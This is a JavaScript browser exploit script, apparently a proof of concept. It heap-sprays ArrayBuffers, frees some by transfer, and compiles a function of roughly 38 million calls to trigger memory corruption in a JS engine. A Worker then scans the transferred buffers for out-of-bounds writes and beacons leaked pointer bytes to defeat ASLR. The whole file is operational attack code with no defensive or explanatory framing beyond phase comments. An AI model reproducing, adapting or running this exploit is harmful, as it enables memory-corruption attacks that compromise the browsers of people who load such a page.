// p158b — Main-thread compile + Worker poll via transfer (no pre-heat)
// Beacon prefix: V158-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V158-' + tag + '?t=' + Date.now(), false);
      x.send('');
    } catch(e) {}
  }

  BS('BOOT');

  var BUF_SZ = 100112;
  var SPRAY_COUNT = 600;

  // Phase 1: Spray ArrayBuffers (same size class as MetadataTable)
  var bufs = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  BS('SPRAY-' + SPRAY_COUNT);

  // Phase 2: Free even-indexed via structuredClone transfer (neutering)
  // This properly detaches backing stores — conservative GC won't pin them
  var xferred = 0;
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      xferred++;
    } catch(e) {
      if (xferred === 0) { BS('XFER-ERR-' + e.message.substring(0, 40)); break; }
    }
    bufs[i] = null;
  }
  BS('FREED-' + xferred);

  // Phase 3: Collect surviving odd-indexed buffers
  var surviving = [];
  var survIdx = [];
  for (var i = 1; i < SPRAY_COUNT; i += 2) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      surviving.push(bufs[i]);
      survIdx.push(i);
    }
  }
  BS('ALIVE-' + surviving.length);
  bufs = null;

  // Phase 3b: Extend mapped region FORWARD with same-size buffers
  // These allocate NEW marge pages above the spray, extending forward coverage
  // Free via structuredClone transfer so pages stay mapped but backing stores freed
  var extCount = 0;
  var extBufs = [];
  for (var i = 0; i < 500; i++) {
    try { extBufs.push(new ArrayBuffer(BUF_SZ)); extCount++; } catch(e) { break; }
  }
  for (var i = 0; i < extBufs.length; i++) {
    try { structuredClone(extBufs[i], {transfer: [extBufs[i]]}); } catch(e) {}
    extBufs[i] = null;
  }
  extBufs = null;
  BS('EXT-' + extCount);

  // Phase 4: setTimeout to unwind stack, GC, compile function on MAIN THREAD
  setTimeout(function() {
    for (var g = 0; g < 12; g++) {
      var junk = [];
      for (var j = 0; j < 50000; j++) junk.push({x: j});
      junk = null;
    }
    BS('GC-DONE');

    // Build 38M op_call function
    var N = 38348816;
    var CK = 4000000;
    var nC = Math.floor(N / CK);
    var rem = N - nC * CK;
    var rep = 'a();'.repeat(CK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p158fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p158ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { BS('SCRIPT-ERR'); };
    sc.onload = function() {
      BS('COMPILED-' + (window.__p158ok ? 'OK' : 'FAIL'));
      if (!window.__p158ok) return;
      doExploit();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }, 300);

  function doExploit() {
    // Build Worker that polls transferred ArrayBuffers for OOB corruption
    var wSrc = [
      'var views=[];var found=false;var polls=0;',
      'function WBS(tag){',
      '  try{var x=new XMLHttpRequest();',
      '  x.open("POST","/beacon/V158-"+tag+"?t="+Date.now(),false);',
      '  x.send("");}catch(e){}',
      '}',
      'self.onmessage=function(e){',
      '  if(e.data.t==="b"){views.push(new Uint8Array(e.data.b));}',
      '  else if(e.data.t==="go"){WBS("WPOLL-START-"+views.length);doPoll();}',
      '};',
      'function hexB(v){return(v<16?"0":"")+v.toString(16);}',
      'function doPoll(){',
      '  if(found)return;',
      '  polls++;',
      '  for(var vi=0;vi<views.length;vi++){',
      '    var v=views[vi];',
      '    for(var i=12;i<v.length-3;i+=4){',
      '      if(v[i]===0xFF&&v[i+1]===0xFF&&v[i+2]===0xFF&&v[i+3]===0xFF){',
      '        found=true;',
      '        var eBase=i-12;',
      '        var pOff=eBase+24;',
      '        if(pOff+8>v.length)continue;',
      '        var hex="";',
      '        for(var h=7;h>=0;h--)hex+=hexB(v[pOff+h]);',
      '        WBS("HIT-B"+vi+"-OFF"+i+"-BASE"+eBase+"-P"+polls);',
      '        WBS("THUNK-"+hex);',
      '        WBS("ASLR-LEAK");',
      '        return;',
      '      }',
      '    }',
      '  }',
      '  if(polls%500===0)WBS("POLL-"+polls);',
      '  if(polls<100000)setTimeout(doPoll,0);',
      '  else WBS("TIMEOUT-"+polls);',
      '}',
    ].join('\n');

    var wBlob = new Blob([wSrc], {type: 'application/javascript'});
    var worker = new Worker(URL.createObjectURL(wBlob));

    worker.onmessage = function(e) {
      if (e.data.t === 'hit') {
        BS('HIT-B' + e.data.vi + '-BASE' + e.data.base + '-P' + e.data.p);
        BS('THUNK-' + e.data.thunk);
        BS('ASLR-LEAK');
      } else if (e.data.t === 'timeout') {
        BS('TIMEOUT-' + e.data.p);
      }
    };

    // Transfer surviving ArrayBuffers to Worker
    // Physical memory stays at same addresses — sweep will still write to them
    var xferCount = 0;
    for (var i = 0; i < surviving.length; i++) {
      try {
        worker.postMessage({t: 'b', b: surviving[i]}, [surviving[i]]);
        xferCount++;
      } catch(e) { break; }
    }
    BS('WORKER-XFER-' + xferCount);
    surviving = null;

    // Give Worker time to set up views, then signal poll start + call function
    setTimeout(function() {
      worker.postMessage({t: 'go'});
      BS('CALLING');
      try {
        window.__p158fn(function() { throw new Error('p158stop'); });
      } catch(e) {
        BS('THREW');
      }
      BS('SURVIVED');
    }, 200);
  }
})();
